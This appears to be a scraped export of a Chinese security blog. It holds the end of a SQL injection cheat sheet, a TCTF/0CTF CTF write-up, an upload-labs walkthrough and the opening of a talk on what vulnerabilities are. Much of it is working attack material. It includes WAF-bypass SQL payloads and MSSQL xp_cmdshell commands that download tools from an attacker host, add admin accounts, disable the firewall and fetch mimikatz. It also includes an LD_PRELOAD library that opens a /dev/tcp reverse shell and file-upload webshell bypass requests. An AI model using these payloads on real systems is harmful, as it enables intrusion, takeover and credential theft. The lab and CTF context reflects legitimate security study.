|+----------+-----------+1 row in set (0.00 sec) 尝试查询包含有空格的admin数据，发现空格被截断，查到admin的数据 1234567mysql&gt; select * from users where username = 'admin ';+----------+-----------+| username | password |+----------+-----------+| admin | rand_pass |+----------+-----------+1 row in set (0.00 sec) 接着尝试插入admin后面包含有空格的账户，使得前25个字符只包含有admin与空格 1234567891011121314151617181920mysql&gt; INSERT INTO users(username,password) VALUES ('admin 1', '123456');Query OK, 1 row affected (0.001 sec)mysql&gt; select * from users;+---------------------------+-----------+| username | password |+---------------------------+-----------+| admin | rand_pass || admin | 123456 |+---------------------------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from users where username = 'admin' and password = '123456';+---------------------------+----------+| username | password |+---------------------------+----------+| admin | 123456 |+---------------------------+----------+1 row in set (0.00 sec) 可以发现我们成功查找到username=admin的账户，后面不需要为 1 ，只要用空格填充前面的字符直到满足 25 个字符 1INSERT INTO users(username,password) VALUES ('admin x', 'hasaki'); 一次性注入出全部结构1(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x) 如果可以回显，可以用这个 payload 一次性全部注入出表结构 绕过技巧空格替代1%09 %0A %0B %0C %0D %A0 %20 /**/ /*!*/ 1234561'/*!Union*//*!select*/1,2#1'/*!Union*/select/*!1,2*/#select username() from user where 1=1 and 2=2可以写成select(username())from user where(1=1)and(2=2) 绕过关键字双写关键字对于针对替换关键字的绕过，我们可以使用双写关键字来绕过，例如uniunionon 十六进制12345678910select a from yz where b=0x32;select * from yz where b=char(0x32);select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)select column_name from information_schema.tables where table_name=\"users\"select column_name from information_schema.tables where table_name=0x7573657273SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) ASCII1234567891011121314151617181920212223or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。双重编码绕过?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+一些unicode编码举例： 单引号：'%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9 逗号绕过12345678910mid(user() from 1 for 1)substr(user() from 1 for 1)select substr(user()from -1) from yz ;select ascii(substr(user() from 1 for 1)) &lt; 150;同时也可以利用替换函数select left(database(),2)&gt;'tf';selete * from testtable limit 2,1;selete * from testtable limit 2 offset 1; 比较符号绕过过滤了&gt;或者&lt;，我们可以用greatest或者least 12greatest(ascii(mid(user(),0,1)),150)least(ascii(mid(user(),0,1)),150) 字符串比较函数 strcmp(expr1,expr2) 如果两个字符串是一样则返回 0 ，如果第一个小于第二个则返回 -1 find_in_set(str,strlist) 如果相同则返回 1，不同则返回 0 字符串连接函数 concat(str1,str2) 将字符串首尾相连 concat_ws(separator,str1,str2) 将字符串用指定连接符连接 group_concat() 运算符算术运算符1+ - * / 比较运算符1= &lt;&gt; != &gt; &lt; between select database() between 0x61 and 0x7a; select database() between ‘a’ and ‘z’; in select ‘123’ in (‘12’) =&gt; 0 Like(模糊匹配) select ‘12345’ like ‘12%’ =&gt; true regexp 或 rlike(正则匹配) select ‘123455’ regexp ‘^12’ =&gt; true 逻辑运算符1234not或! 非 AND 逻辑与 == &amp;&amp;OR 逻辑或 == ||XOR 逻辑异或 == ^ 位运算符123456&amp; 按位与| 按位或^ 按位异或! 取反&lt;&lt; 左移&gt;&gt;右移 Reference当表名可控的注入遇到了Describe时的几种情况 MySQL Error Based SQL Injection （报错注入）总结 MySql注入备忘录 SQL注入备忘录 SQL注入绕过技巧 MSSQLBasic系统库 系统数据库 描述 master 数据库 记录 SQL Server实例的所有系统级信息。这个数据库包括所有的配置信息、用户登录信息、当前正在服务器中运行的进程的信息。 msdb 数据库 用于 SQL Server 代理计划警报和作业。msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一 个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。 model 数据库 用作 SQL Server实例上创建的所有数据库的模板。 对 model 数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。 Resource 数据库 一个只读数据库，包含 SQL Server包括的系统对象。 系统对象在物理上保留在 Resource 数据库中，但在逻辑上显示在每个数据库的 sys 架构中。 tempdb 数据库 一个工作空间，用于保存临时对象或中间结果集。tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到 tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建◊永远不要在tempdb数据库建立需要永久保存的表。 注释 参数 风格 /* C语言风格 – SQL注释风格 ;%00 空字节 查询语句主机名1select @@SERVERNAME; 数据库版本1select @@VERSION 数据库名1select db_name() 数据库ip地址1select local_net_address from sys.dm_exec_connextions where Session_id=@@spid 暴当前表中的列12article.asp?id=6 group by admin.username having 1=1--article.asp?id=6 group by admin.username,admin.password having 1=1-- 暴任意表和列12and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1and (select top col_name(object_id('admin'),N) from sysobjects)&gt;1 暴数据库数据1and (select top 1 password from admin where id=N)&gt;1 Exmaples12345query: SELECT username, password FROM Users WHERE id = '1';1' HAVING 1=1 -- 错误1' GROUP BY username HAVING 1=1-- -- 错误1' GROUP BY username, password HAVING 1=1-- -- 正确Group By可以用来测试列名 123456789101112131415161718192021222324252627282930313233343536USE masterGORECONFIGURE --先执行一次刷新，处理上次的配置GOEXEC sp_configure 'show advanced options',1 --启用xp_cmdshell的高级配置GORECONFIGURE --刷新配置GOEXEC sp_configure 'xp_cmdshell',1 --打开xp_cmdshell,可以调用SQL系统之外的命令GORECONFIGUREGO--使用xp_cmdshell在D盘创建一个myfile 文件夹EXEC xp_cmdshell 'mkdir d:\\myfile',no_output --[no_output]表示是否输出信息GOsp_configure 'show advanced options',1; (记得reconfigure) sp_configure 'xp_cmdshell',1;（记得reconfigure）启用xp_cmdshellexec xp_cmdshell 'dir c:\\ /s /b |findstr \"key\"|findstr \"txt\"'; 找到key的位置exec xp_cmdshell 'type key位置\"'; 直接读key内容，不过一般不会让你有直接读的权限exec xp_cmdshell 'cacls c:\\ /s /b |findstr \"key\"|findstr \"txt\" /E /G adminstrator:F'; 改变文件操作权限，F是所有权限，改变权限后再读就能成功exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/3389.exe'; 这里的certutil的方式与基础题4中的curl思路相同，可参考。这里上传的是开启3389的工具。exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';创建账户exec xp_cmdshell 'netsh firewall set opmode disable'; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/mimikazts.exe';如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。exec master..xp_cmdshell ‘dir “C:\\Documents and Settings\\Administrator\\桌面\\” /A -D /B’exec xp_cmdshell ‘type “C:\\Documents and Settings\\Administrator\\桌面\\key.txt”‘ Reference【技术分享】MSSQL 注入攻击与防御","link":"/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"TCTF/0CTF-Web 记录","text":"上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。 Web1 Ghost PepperDescription ​ Do you know ghost pepper? Let’s eat. http://111.186.63.207:31337 Hacking由于环境关掉了，这里就不放图了。说一下几个解法。 首先通过弱口令 karaf/karaf 进行认证，进入发现是 jetty 的中间件，然后思路一直走偏在这个中间件上，直到有师傅跟我说 ghost pepper 指的是 Jolokia…nb… 然后又参考了几篇腾讯云鼎的相关文章： Exploiting Jolokia Agent with Java EE Servers 尝试了 JNDI 注入，发现 proxymode 没开，所以得另想法子，在/jolokia/list 我们发现了一些库，最终目标聚集到了 karaf 上。 第一种解法是通过激活 webconsole 这个 karaf 的 feature ，进入 webconsole ，这是一个类似 Tomcat Manager 后台的一个东西，进入之后可以上传 bundle ，并且勾选自动 refresh bundle ，就相当于上传了一个 webshell 一样，直接连就好了，关于 bunlde 的构建留到下面讲吧。还有就是进去 Main/gogo 的选项，就可以拿到 karaf 内置的一个 shell ，具体命令可以参考 Shell console basics，通过shell:cat /flag 激活 webconsole 的 payload 如下 1234567891011121314151617POST /jolokia HTTP/1.1Host: 111.186.63.207:31337User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/jsonContent-Length: 146Authorization: Basic a2FyYWY6a2FyYWY=Connection: closeUpgrade-Insecure-Requests: 1{ true\"type\":\"EXEC\", \"mbean\":\"org.apache.karaf:name=root,type=feature\", \"operation\": \"installFeature(java.lang.String)\", \"arguments\":[\"webconsole\"]} 还有其他的就是通过好几个/list中的install方法来实现。比如karaf.config或者karaf.bundle的方法都可以，具体方法的实现直接去下一个 karaf 源码来看看就知道了。 123456{ \"type\":\"EXEC\" \"mbean\":\"org.apache.karaf:name=root,type=config\", \"operation\":\"install\", \"arguments\":[\"http://ip:port/webshell.jar\",\"../../../../../opt/opendaylight-0.9.2/deploy/webshell.jar\",false]} 这里karaf.config是个 0day…可以写任意文件 这里利用的难点就是如何构造一个 bundle 文件了…从来都不知道还有这种文件…而且是个.jar文件，而且这个东西的触发点在start函数，非main函数…可以按照马师傅的这个仓库来构建：osgi-bundle-backdoor Web2 Wallbreaker EasyDescription ​ http://111.186.63.208:31340 打开地址可以发现有更多的描述 ​ Imagick is a awesome library for hackers to break disable_functions. So I installed php-imagick in the server, opened a backdoor for you.Let’s try to execute /readflag to get the flag.Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904Hint: eval($_POST[“backdoor”]); The first way to Hack一看题目意图也比较明显，需要我们利用Imagick这个模块去进行 rce 我们先直接看看phpinfo()，发现果然是能执行命令的基本都被 disable 掉了 我们还可以调用readfile()来查看题目源代码 12345678910111213141516&lt;?php$dir = \"/tmp/\" . md5(\"$_SERVER[REMOTE_ADDR]\");mkdir($dir);ini_set('open_basedir', '/var/www/html:' . $dir);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;pre class=\"pre\"&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.So I installed php-imagick in the server, opened a `backdoor` for you.Let's try to execute `/readflag` to get the flag.Open basedir: &lt;?php echo ini_get('open_basedir');?&gt;&lt;?php eval($_POST[\"backdoor\"]);?&gt;Hint: eval($_POST[\"backdoor\"]);&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;Hint: eval($_POST[\"backdoor\"]);&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt; 首先我们来了解一下题目涉及的几个函数 open_basediropen_basedir 将 php 所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。 例如就像这样，设置了ini_set('open_basedir','/var/www/html');之后，我们只能在/var/www/html进行操作，即open_basedir是用来限制访问目录的 Bypass Open_Basedir详细可参考How to bypass disable_functions and open_basedir，文章中就提到可以使用LD_PRELOAD和putenv()函数进行绕过 LD_PRELOAD我们首先来看看什么是LD_PRELOAD LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. 简单来说，LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。 putenv ( string $setting ) : bool 添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 而putenv()可以设置环境换变量，添加我们定义的变量到服务器环境变量。 那么我们大概可以有一个思路，制作一个恶意的.so文件，使用putenv()设置LD_PRELOAD为恶意文件路径，然后使用某个php函数，触发这个.so文件，执行我们的恶意代码。 具体的攻击链可以参考：LD_PRELOAD的偷梁换柱之能 劫持攻击参考的绕过文章使用了mail()函数，我们可以看看 这里确实开启了子进程，那我们再试试引入putenv()的效果，配合动态链接库尝试劫持，代码来自Chankro 其中__attribute__ ((__constructor__))有如下说明 1231.It's run when a shared library is loaded, typically during program startup.2.That's how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit. 所以当我们使用上我们的动态链接库后，就会触发__attribute__ ((__constructor__))，从而达成我们rce的目的。 1234567891011121314151617181920212223242526#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;void pwn(void) {truesystem(\"ls\");truesystem(\"echo hacked\");}void daemonize(void) {truesignal(SIGHUP, SIG_IGN);trueif (fork() != 0) {truetrueexit(EXIT_SUCCESS);true}}__attribute__ ((__constructor__)) void preloadme(void) { unsetenv(\"LD_PRELOAD\"); daemonize(); pwn();} 使用以下命令产生动态链接库 1gcc hack.c -fPIC -shared -o hack.so php 文件中代码为 1234&lt;?phpputenv(\"LD_PRELOAD=./hack.so\");mail('','','','');?&gt; 可以看到已经执行了ls命令并成功输出了hacked，使用strace看看我们可以发现执行顺序。 当然还有另一种劫持，直接选择一个函数进行劫持，例如我们通过strace php test.php发现调用了geteuid()以及getpid()函数，我们可以在hack.c中这么写 1234567891011121314151617#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;signal.h&gt;void pwn(void) {truesystem(\"ls\");truesystem(\"echo hacked!\");}void getpid(){ unsetenv(\"LD_PRELOAD\"); pwn();} 这样也可以完成劫持 GetFlag所以我们需要找到一个可以启动子进程的函数，以实现我们劫持函数做到 RCE 的目的，然后这里我本地调通了但是远程不知道怎么没打通… 这里我直接用new了一个.jpg也可以调用子进程，但是服务器却没有触发… 然后最好还是按照飘零师傅的深入浅出LD_PRELOAD &amp; putenv()用wmv进行了 hook ，最后成功 RCE。 这里的原理就是因为Imagick在处理wmv格式的文件会起一个子进程来处理，所以就达到了我们的目的。还有很多格式的文件都可以，可以参考 ctftime 上该题的其他 wp。 12345678910111213141516171819202122232425#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;void pwn(void) {truesystem(\"bash -c \\\"sh &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1\\\" \");}void daemonize(void) {truesignal(SIGHUP, SIG_IGN);trueif (fork() != 0) {truetrueexit(EXIT_SUCCESS);true}}__attribute__ ((__constructor__)) void preloadme(void) { unsetenv(\"LD_PRELOAD\"); daemonize(); pwn();} 至于怎么传文件到服务器上，有很多种方法，比如file_put_contents()，也可以用如下的方式 12copy(\"http://106.14.153.173:8080/hack.wmv\", \"/tmp/3b1412753f475cc969c37231dd6eaea2/hack.wmv\");copy(\"http://106.14.153.173:8080/hack.so\", \"/tmp/3b1412753f475cc969c37231dd6eaea2/hack.so\"); The other way也可以利用error_log这个方法，这个方法也开启了子进程调用了sendmail方法。按照之前的思路进行就可以了 参考无需sendmail：巧用LD_PRELOAD突破disable_functions The second way to Hack这里也主要是用了 123&lt;delegate decode=\"bpg\" command=\"&amp;quot;@BPGDecodeDelegate@&amp;quot; -b 16 -o &amp;quot;%o.png&amp;quot; &amp;quot;%i&amp;quot;; @MVDelegate@ &amp;quot;%o.png&amp;quot; &amp;quot;%o&amp;quot;\"/&gt;//\"@BPGDecodeDelegate@\" -b 16 -o \"%o.png\" \"%i\"; @MVDelegate@ \"%o.png\" \"%o\" 这里参考了其他师傅的 wp ，主要是利用了@BPGDecodeDelegate对于后缀.bpg的解析，它会去 PATH 中寻找相关的bpgenc文件 所以我们只需要设置一个恶意的 PATH ，并在这个文件夹下放入我们的可执行文件。 只要找到函数要执行的文件我们就可以进行操作了。例如下面用了Imagick-&gt;readImage()的方法 Conclusion这次比赛还是玩的比较有收获的，至少给我打发了周末等面试结果的煎熬时光2333…第一题自己想法是通过 karaf.shell 去做，然而并没有找到突破点，还是跟另一个师傅弄了 karaf.config 的 install 方法去做的。菜还是菜，并没有去发掘文档深入的点。第二题在比赛中因为没什么时间了，就没怎么去看了。赛后复现觉得自己对 php 底层了解的很少，打算这段时间可以去往这方面发掘一下。也还有关于第二题解法二的发掘点还存在一定的疑惑，可能就是从 fuzz bpg 格式开始寻找到的突破点吧。还看到了另一个关于题二的解法，等会还可以研究下一下。","link":"/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/"},{"title":"UploadLab WriteUp","text":"The writeup of UploadLab. Upload-LabsInfo.php 代码为 123&lt;?php phpinfo();?&gt; Pass-01随便上传一个 shell 发现回显 1该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php 发现是个前端检查，改成.jpg绕过，用 burp 抓包再改成.php即可 Pass-02上传 info.php 发现回显 1提示：文件类型不正确，请重新上传！ 抓包将修改上传文件字段: 1Content-Type: image/jpeg Pass-03上传 info.php 发现回显 1提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！ 黑名单绕过，将后缀名改成 1filename=\"shell.php5\" apache 的httpd.conf中有如下配置代码 1AddType application/x-httpd-php .php .phtml .phps .php5 .pht Pass-04上传 info.php 发现回显 1此文件不允许上传! 但是上传一个图片发现是没有改文件名的。看代码发现几乎所有能用的后缀名都进了黑名单，唯独没有.htaccess，于是我们可以上传.htaccess，文件内容如下 1SetHandler application/x-httpd-php 可以将当前目录下所有文件都当作 php 文件处理，这时候传个改了后缀的 php 文件就好 Pass-05虽然.htaccess被过滤了，但是审计代码发现转换大小写，可以用大小写绕过 1filename=\"info.PHP\" Pass-06发现少了trim()函数，没有进行去空处理，后缀加个空格就好了 1filename=\"info.php \" Pass-07发现没有去除末尾的点，所以我们可以用info.php.来绕过，在 windows 环境下，会自动去掉后缀名中最后的. Pass-08发现没有去除::$DATA，可以在末尾添加::$DATA，这个在 windows 环境下也会解析。 Pass-09这里用info.php. .绕过，注意中间有一个空格。 1234567$file_name = trim($_FILES['upload_file']['name']); //info.php. .$file_name = deldot($file_name);//删除文件名末尾的点 //info.php.空格if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; // UPLOAD_PATH/.info.php.空格} 同样，windows 环境下自动忽略末尾的.与空格 Pass-10置换了关键字，可以双写绕过，但是注意顺序，例如info.pphphp，因为phphpp这样会置换第一个php为空，就形成了后缀.hpp Pass-11123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; }} 从源代码可以发现，虽然用了白名单模式，但是我们可以控制上传路径，利用CVE-2015-2348进行 00 截断 漏洞影响版本必须在5.4.x&lt;= 5.4.39，5.5.x&lt;= 5.5.23，5.6.x &lt;= 5.6.7 123456789101112131415161718192021222324POST /Pass-11/index.php?save_path=../upload/test.php%00 HTTP/1.1Host: localhost:8002User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://localhost:8002/Pass-11/index.phpContent-Type: multipart/form-data; boundary=---------------------------1397349150366000458976532598Content-Length: 356Connection: closeUpgrade-Insecure-Requests: 1-----------------------------1397349150366000458976532598Content-Disposition: form-data; name=\"upload_file\"; filename=\"info.jpg\"Content-Type: text/php&lt;?phpphpinfo();?&gt;-----------------------------1397349150366000458976532598Content-Disposition: form-data; name=\"submit\"上传-----------------------------1397349150366000458976532598-- Pass-12只是把11中的路径改成了$_POST['save_path']，方法无异 Pass-13找几个 png 、 jpg 或者 gif 图片直接用echo \"&lt;?php phpinfo();?&gt;\" &gt;&gt; xxx.jpg就可以做成图片马了，直接用文件包含漏洞即可 Pass-14和13一样，只不过13 check 前面两字节的数据头，14用了以下代码更为严格，但是我们用13的方法是在图片末尾追加的代码段，整个图片还是个完整的图片没有被破坏，也就绕过了检测 12$info = getimagesize($filename);$ext = image_type_to_extension($info[2]); Pass-15同14关 Pass-16详细参考upload-labs之pass 16详细分析 这里考察的是二次渲染的绕过，用 GIF 绕过会相对比较简单，直接在GIF98a下面加入 php 代码即可 Pass-17比较典型的条件竞争 1234567891011121314151617181920if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; }} 从代码看，因为先移动文件到 upload 文件夹然后判断后缀再删除，是可以通过一定的时间差来访问自己上传的文件导致写入 shell 的。可以上传 1&lt;?php file_put_contents(\"shell.php\",\"&lt;?php phpinfo();?&gt;\");?&gt; 这样只要一次访问成功该 php 文件，即可拿到 shell Pass-18与17问题类似，在移动后再改名可能被会有条件竞争的漏洞 123456789101112131415// if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } 讲道理这里我看很多师傅用的是传图片马，但是需要利用到文件包含，而作者意思我觉得肯定不是这样的，否则用竞争来干嘛？直接传个图片马不就好了，反正最后都会返回文件名。 这里个人觉得预期解是通过 Apache 解析漏洞来配合条件竞争利用的。 ​ Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 所以我们传个.php.7z为后缀的文件，再通过条件竞争去访问这个文件就可以写入 shell 了。 Pass-19利用pathinfo的特性绕过 1234var_dump(pathinfo(\"/testweb/test.txt/.\",PATHINFO_EXTENSION));string(0) \"\"var_dump(pathinfo('/testweb/test.php\\00.jpg',PATHINFO_EXTENSION));string(3) \"jpg\" 当然也可以利用\\00绕过，move_uploaded_file会忽略后面的.jpg Pass-20源代码 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } }}else{ $msg = \"请选择要上传的文件！\";} 这里主要是利用了一个end与count的函数特性，根据 php 文档 ​ end (PHP 4, PHP 5, PHP 7) end — 将数组的内部指针指向最后一个单元 ​ count (PHP 4, PHP 5, PHP 7) count — 计算数组中的单元数目，或对象中的属性个数 这里我们就看得更清楚了，end取的是最后一个元素，无论下标是什么，而count($arr)-1取的是下标为为最后的元素，例如下面这段代码 1234567&lt;?php$arr = array(\"0\"=&gt;\"jpg\", \"2\"=&gt;\"php\", \"1\"=&gt;\"jpg\");var_dump(end($arr));var_dump($arr[count($arr) - 1]);string(3) \"jpg\"string(3) \"php\" 我们创建了一个数组，数组顺序不是按照寻常的顺序的，我们故意把最后一个元素排在了前面一位的话，这样end就取到了jpg后缀，这样我们就可以利用$_POST[save_name]来绕过最后后缀检测了 1234567891011121314151617181920212223242526272829303132POST /Pass-20/index.php?action=show_code HTTP/1.1Host: localhost:8002User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://localhost:8002/Pass-20/index.php?action=show_codeContent-Type: multipart/form-data; boundary=---------------------------137136829317924008472127919060Content-Length: 617Connection: closeUpgrade-Insecure-Requests: 1-----------------------------137136829317924008472127919060Content-Disposition: form-data; name=\"upload_file\"; filename=\"info.jpg\"Content-Type: image/gif&lt;?phpphpinfo();?&gt;-----------------------------137136829317924008472127919060Content-Disposition: form-data; name=\"save_name[1]\"upload-20.php-----------------------------137136829317924008472127919060Content-Disposition: form-data; name=\"save_name[0]\"jpg-----------------------------137136829317924008472127919060Content-Disposition: form-data; name=\"submit\"上传-----------------------------137136829317924008472127919060-- 这里需要注意的是，save_name[0]放jpg就好了，否则$ext拿到的是upload-20.jpg，这样整个字符串就会进入!in_array($ext, $allow_suffix)这个判断里面了。 Conclusion这个靶场还是挺好的，总结得都相当不错。如果能配合更多的中间件解析漏洞来做的话会更棒，因为很多时候我们做到的仅仅是上传一个 jpg 啥的，如果配合解析漏洞或者文件包含，可以进一步扩大杀伤力。","link":"/2019/03/18/UploadLab-WriteUp/"},{"title":"Vulnerabilites For A2OS","text":"这是给A2OS做的关于 Web 安全的分享内容概要 VulnerabilityIntroductionWhat is a vulnerability ?什么是漏洞？漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。具体举例来说，比如在Intel Pentium芯片中存在的逻辑错误，在Sendmail早期版本中的编程错误，在NFS协议中认证方式上的弱点，在 Unix 系统管理员设置匿名Ftp服务时配置不当的问题都可能被攻击者使用，威胁到系统的安全。因而这些都可以认为是系统中存在的安全漏洞。 In computer security, a vulnerability is a weakness which can be exploited by a threat actor, such as an attacker, to perform unauthorized actions within a computer system. To exploit a vulnerability, an attacker must have at least one applicable tool or technique that can connect to a system weakness. In this frame, vulnerability is also known as the attack surface. 漏洞是天生的吗？既然是天生存在的，为什么设计者不去找需要安全工作者去找？被利用的叫漏洞，没被利用的能叫漏洞吗？ 在计算机领域，漏洞特指系统的安全方面存在缺陷，一般被定义为信息系统设计、编码和运行当中引起的、可能被外部利用用于影响信息系统机密性、完整性、可用性的缺陷。 统计表明，程序员每写 1000 行代码，就会有 1 个缺陷，一个大型的应用系统，代码行数动辄几十万行，甚至更多。可以说，从世界上第一个操作系统或应用软件诞生的那天开始，缺陷就存在于 IT 系统的各个环节，而且始终会存在。 漏洞来源首先漏洞来自操作缺陷。 程序员编程序时的疏忽、运维人员设置安全配置时的不当操作、用户设置的简单口令和泄露……这些人为的、无意的失误就是操作缺陷。 其次，漏洞来自认知缺陷。 2000年的“千足虫”危机，过去为了节省空间，存储年份用两位十进制数表示，例如1980就是80，1998年出生就是98-80=18，但是在2000就变成了负数，就会引起各种系统紊乱甚至崩溃。 2018年1月的 Meltdown &amp; Spectre 。为了提升 CPU 处理性能，芯片企业用乱序执行和预测执行。通俗来说，CPU 并不完全严格按照指令的顺序来执行，而是会自己预测可能要执行的内容，以及为了更好地利用 CPU 资源将指令顺序打乱，以便能同时执行一些指令。 但设计者没有考虑到，或者没有人为这个问题时重要的，即：由于 CPU 缓存内容没有同步恢复到原始状态，导致缓存中存储的重要信息可以被漏洞利用者获取，可能会造成受保护的密码和敏感信息泄露。 